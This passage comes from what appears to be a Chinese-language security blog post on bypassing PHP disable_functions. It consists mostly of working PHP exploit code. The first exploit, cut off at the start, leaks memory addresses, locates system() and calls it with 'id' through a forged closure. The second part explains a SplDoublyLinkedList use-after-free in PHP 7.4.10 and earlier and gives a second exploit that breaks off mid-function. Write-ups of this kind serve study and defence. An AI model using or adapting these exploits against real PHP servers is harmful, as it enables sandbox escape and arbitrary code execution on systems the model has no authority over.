class="hljs-variable">$name_addr</span>), <span class="hljs-number">0x00</span>)));<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-variable">$name</span>)[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$funcs</span>)) &#123;<br>            <span class="hljs-keyword">return</span> [<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$prefix</span>) . <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span>), <span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT),<br>                <span class="hljs-variable">$std_object_handlers</span>, <span class="hljs-variable">$NumPrefix</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSystem</span>(<span class="hljs-params"><span class="hljs-variable">$unknown_func</span></span>) </span>&#123;<br>    <span class="hljs-variable">$unknown_addr</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$prefix</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$unknown_addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>    <span class="hljs-variable">$unknown_addr</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-variable">$start</span> = <span class="hljs-variable">$unknown_addr</span> &amp; <span class="hljs-number">0x00000000ffffffff</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x800</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x20</span> * <span class="hljs-variable">$i</span>;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>), <span class="hljs-number">8</span>,<br>                <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &gt; <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">2</span>] || <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &lt;<br>            <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">3</span>]) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$name_addr</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">s2b</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$name_addr</span>), <span class="hljs-number">0x00</span>)));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&quot;system&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span> + <span class="hljs-number">0x08</span>), <span class="hljs-number">8</span>,<br>                    <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x800</span>;<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> + <span class="hljs-number">0x20</span> * <span class="hljs-variable">$i</span>;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>), <span class="hljs-number">8</span>,<br>                <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &gt; <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">2</span>] || <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$name_addr</span>) &lt;<br>            <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">3</span>]) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-variable">$name_addr</span> = <span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-variable">$name_addr</span>, <span class="hljs-number">16</span>, <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT);<br>        <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">s2b</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$name_addr</span>), <span class="hljs-number">0x00</span>)));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&quot;system&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span> + <span class="hljs-number">0x08</span>), <span class="hljs-number">8</span>,<br>                    <span class="hljs-string">&quot;0&quot;</span>, STR_PAD_LEFT))));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$rp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionProperty</span>(<span class="hljs-title class_">Test</span>::<span class="hljs-variable language_">class</span>, <span class="hljs-string">&#x27;prop&#x27;</span>);<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>;<br><span class="hljs-variable">$test</span> -&gt; prop = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelperHelperHelperHelperHelperHelperHelper</span>;<br><span class="hljs-variable">$abc</span> = <span class="hljs-variable">$rp</span> -&gt; <span class="hljs-title function_ invoke__">getType</span>() -&gt; <span class="hljs-title function_ invoke__">getName</span>();<br><span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelperHelperHelperHelperHelperHelperHelper</span>();<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$abc</span>) &lt; <span class="hljs-number">1000</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;UAF Failed!&quot;</span>);<br>&#125;<br><span class="hljs-variable">$helper</span> -&gt; a = <span class="hljs-variable">$helper</span>;<br><span class="hljs-variable">$php_heap</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-variable">$helper</span> -&gt; a = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;&#125;;<br><span class="hljs-variable">$std_object_handlers</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-number">0x0</span>);<br><span class="hljs-variable">$prefix</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$php_heap</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Helper Object Address: &quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$php_heap</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;std_object_handlers Address: &quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$std_object_handlers</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$closure_object</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Closure Object: &quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$closure_object</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x28</span>, <span class="hljs-string">&quot;\x06&quot;</span>);<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$unknown_func</span> = <span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$std_object_handlers</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine funcs address&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Find func&#x27;s adress: &quot;</span> . <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&quot; -&gt; &quot;</span> . <span class="hljs-variable">$unknown_func</span>[<span class="hljs-number">0</span>] .<br>    <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$system_address</span> = <span class="hljs-title function_ invoke__">getSystem</span>(<span class="hljs-variable">$unknown_func</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine system address&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Find system&#x27;s handler: &quot;</span> . <span class="hljs-variable">$system_address</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span> &lt; (<span class="hljs-number">0x130</span> / <span class="hljs-number">0x08</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x308</span> + <span class="hljs-number">0x08</span> * (<span class="hljs-variable">$i</span> + <span class="hljs-number">1</span>), <span class="hljs-title function_ invoke__">leak2</span>(<span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">s2b</span>(<span class="hljs-variable">$closure_object</span>, <span class="hljs-number">0x08</span> *<br>            <span class="hljs-variable">$i</span>)));<br>&#125;<br><span class="hljs-variable">$abc</span>[<span class="hljs-number">0x308</span> + <span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;\x01&quot;</span>;<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x308</span> + <span class="hljs-number">0x70</span>, <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$system_address</span>));<br><span class="hljs-title function_ invoke__">write</span>(<span class="hljs-number">0x10</span>, <span class="hljs-variable">$prefix</span> . <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">s2n</span>(<span class="hljs-variable">$php_heap</span>) + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x308</span> + <span class="hljs-number">0x08</span>)));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Fake Closure Object Address: &quot;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$prefix</span> .<br>        <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">str_pad</span>(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">s2n</span>(<span class="hljs-variable">$php_heap</span>) + <span class="hljs-number">0x18</span> + <span class="hljs-number">0x308</span> + <span class="hljs-number">0x08</span>), <span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>,<br>            STR_PAD_LEFT))) . <span class="hljs-string">&quot;\n&quot;</span>;<br>(<span class="hljs-variable">$helper</span> -&gt; a)(<span class="hljs-string">&quot;id&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="php7-SplDoublyLinkedList-UAF"><a href="#php7-SplDoublyLinkedList-UAF" class="headerlink" title="php7_SplDoublyLinkedList UAF"></a>php7_SplDoublyLinkedList UAF</h2><p><strong>利用条件</strong></p><ul><li>PHP v7.4.10及其之前版本</li><li>PHP v8.0（Alpha）</li></ul><blockquote><p>如果限制了 openbase_dir ，则需要进行爆破，而且爆破还会导致进程崩溃</p></blockquote><p><strong>原理</strong></p><p>PHP的SplDoublyLinkedList双向链表库中存在一个用后释放漏洞，该漏洞将允许攻击者通过运行PHP代码来转义disable_functions限制函数。在该漏洞的帮助下，远程攻击者将能够实现PHP沙箱逃逸，并执行任意代码。更准确地来说，成功利用该漏洞后，攻击者将能够绕过PHP的某些限制，例如disable_functions和safe_mode等等</p><p><a href="https://xz.aliyun.com/t/8355">通过UAF bypass PHP disabled functions</a><br><a href="https://www.freebuf.com/articles/web/251017.html">PHP SplDoublyLinkedList中的用后释放漏洞分析</a><br><a href="https://bugs.php.net/bug.php?id=80111">PHP SplDoublyLinkedList::offsetUnset UAF Sandbox Escape</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">120</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i2s</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$i</span>, <span class="hljs-variable">$x</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$j</span> &lt; <span class="hljs-variable">$x</span>;<span class="hljs-variable">$j</span>++) &#123;<br>        <span class="hljs-variable">$a</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$j</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span> &amp; <span class="hljs-number">0xff</span>);<br>        <span class="hljs-variable">$i</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">s2i</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$x</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>);<span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$result</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>        <span class="hljs-variable">$result</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$x</span>]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-title function_ invoke__">i2s</span>(<span class="hljs-variable">$a</span>, <span class="hljs-number">0x00</span>, <span class="hljs-variable">$address</span> - <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span> -&gt; <span class="hljs-title function_ invoke__">current</span>());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getPHPChunk</span>(<span class="hljs-params"><span class="hljs-variable">$maps</span></span>) </span>&#123;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/([0-9a-f]+\-[0-9a-f]+) rw\-p 00000000 00:00 0 /&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$maps</span>, <span class="hljs-variable">$match</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$match</span>[<span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$start</span>, <span class="hljs-variable">$end</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$length</span> = <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$end</span>)) - <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$start</span>))) &gt;= <span class="hljs-number">0x200000</span> &amp;&amp; <span class="hljs-variable">$length</span> &lt;= <span class="hljs-number">0x300000</span>) &#123;<br>            <span class="hljs-variable">$address</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$start</span>)), <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$end</span>)), <span class="hljs-variable">$length</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]PHP Chunk: &quot;</span> . <span class="hljs-variable">$start</span> . <span class="hljs-string">&quot; - &quot;</span> . <span class="hljs-variable">$end</span> . <span class="hljs-string">&quot;, length: 0x&quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$length</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bomb1</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test1&quot;</span>])) === <span class="hljs-number">0x5454545454545454</span>) &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test1&quot;</span>]) &amp; <span class="hljs-number">0x7ffff0000000</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Where is here&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">bomb2</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span></span>) </span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">s2i</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;test2&quot;</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">getElement</span>(<span class="hljs-variable">$a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-variable">$start</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">0x200000</span>, <span class="hljs-number">0x200000</span>));<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;[!]Not Found&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getElement</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$x</span> &lt; (<span class="hljs-variable">$address</span>[<span class="hljs-number">2</span>] / <span class="hljs-number">0x1000</span> - <span class="hljs-number">2</span>);<span class="hljs-variable">$x</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-number">0x108</span> + <span class="hljs-variable">$address</span>[<span class="hljs-number">0</span>] + <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$x</span> + <span class="hljs-number">0x1000</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$y</span> &lt; <span class="hljs-number">5</span>;<span class="hljs-variable">$y</span>++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$y</span> * <span class="hljs-number">0x08</span>) === <span class="hljs-number">0x1234567812345678</span> &amp;&amp; ((<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$y</span> * <span class="hljs-number">0x08</span> - <span class="hljs-number">0x08</span>) &amp; <span class="hljs-number">0xffffffff</span>) === <span class="hljs-number">0x01</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]SplDoublyLinkedList Element: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-variable">$y</span> * <span class="hljs-number">0x08</span> - <span class="hljs-number">0x18</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$y</span> * <span class="hljs-number">0x08</span> - <span class="hljs-number">0x18</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getClosureChunk</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span>);<br>    &#125;<span class="hljs-keyword">while</span>(<span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span>) !== <span class="hljs-number">0x00</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[+]Closure Chunk: &quot;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$address</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSystem</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$a</span>, <span class="hljs-variable">$address</span></span>) </span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-variable">$address</span> &amp; <span class="hljs-number">0xffffffffffff0000</span>;<br>    <span class="hljs-variable">$lowestAddr</span> = (<span class="hljs-variable">$address</span> &amp; <span class="hljs-number">0x0000fffffff00000</span>) - <span class="hljs-number">0x0000000001000000</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span> * <span class="hljs-number">0x80</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-variable">$i</span> * <span class="hljs-number">0x20</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$addr</span> &lt; <span class="hljs-variable">$lowestAddr</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-variable">$nameAddr</span> = <span class="hljs-title function_ invoke__">leak</span>(<span 